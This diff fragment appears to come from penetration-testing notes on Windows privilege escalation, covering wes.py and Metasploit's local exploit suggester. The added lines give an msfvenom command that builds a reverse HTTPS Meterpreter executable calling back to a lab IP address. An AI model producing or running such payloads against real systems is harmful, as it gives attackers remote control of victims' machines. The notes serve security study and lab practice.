@@ -55,3 +55,6 @@ user@kali$ wes.py systeminfo.txt
 ## Metasploit
 
 If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
+
+Make a bin file using metasploit, example:
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.17.37.35 LPORT=8443 -f exe ->frodoShell64.exe
